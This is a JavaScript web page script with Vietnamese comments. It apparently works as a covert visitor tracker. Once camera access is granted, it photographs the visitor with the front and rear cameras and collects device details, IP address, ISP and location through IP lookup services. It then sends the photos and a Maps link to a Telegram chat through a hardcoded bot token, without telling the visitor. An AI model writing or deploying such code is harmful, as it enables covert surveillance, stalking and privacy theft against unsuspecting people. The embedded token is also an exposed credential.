const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
  time: '', ip: '', isp: '', realIp: '', address: '',
  country: '', lat: '', lon: '', device: '', os: '', camera: '⏳ Đang kiểm tra...'
};

function detectDevice() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  info.time = new Date().toLocaleString('vi-VN');
  if (/Android/i.test(ua)) {
    info.os = 'Android';
    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
    info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
  } else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
    info.os = 'iOS';
    info.device = 'iPhone/iPad';
  } else {
    info.device = platform || 'PC/Laptop';
    info.os = 'Desktop';
  }
}

async function getIPData() {
  try {
    const r1 = await fetch('https://api.ipify.org?format=json');
    const d1 = await r1.json();
    info.ip = d1.ip;
    const r2 = await fetch(`https://ipwho.is/${info.ip}`);
    const d2 = await r2.json();
    info.isp = d2.connection?.org || 'N/A';
    info.country = d2.country || 'Việt Nam';
    info.lat = d2.latitude;
    info.lon = d2.longitude;
    info.address = `${d2.city}, ${d2.region}`;
  } catch (e) {}
}

async function captureCamera(facingMode = 'user') {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
    return new Promise(resolve => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setTimeout(() => {
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
        }, 800);
      };
    });
  } catch (e) { return null; }
}

function getCaption() {
  const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
  return `
📡 [THÔNG TIN TRUY CẬP]
🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device} (${info.os})
🌍 IP: ${info.ip}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
📍 Maps: ${mapsLink}
`.trim();
}

async function main() {
  // BƯỚC 1: Thử chụp ảnh TRƯỚC
  let f = await captureCamera("user");
  
  // BƯỚC 2: Nếu KHÔNG chụp được ảnh (người dùng bấm Từ chối), DỪNG LUÔN
  if (!f) {
    console.log("Quyền bị từ chối. Không gửi dữ liệu.");
    return; // Thoát hàm, không chạy các lệnh bên dưới
  }

  // BƯỚC 3: Nếu đã cho phép, mới lấy IP và vị trí
  detectDevice();
  await getIPData();
  
  // Chụp thêm cam sau (nếu có)
  let b = await captureCamera("environment");

  // BƯỚC 4: Gửi dữ liệu
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  const media = [{ type: 'photo', media: 'attach://f', caption: getCaption() }];
  formData.append('f', f, 'f.jpg');
  
  if (back) {
    media.push({ type: 'photo', media: 'attach://b' });
    formData.append('b', b, 'b.jpg');
  }

  formData.append('media', JSON.stringify(media));
  await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
}
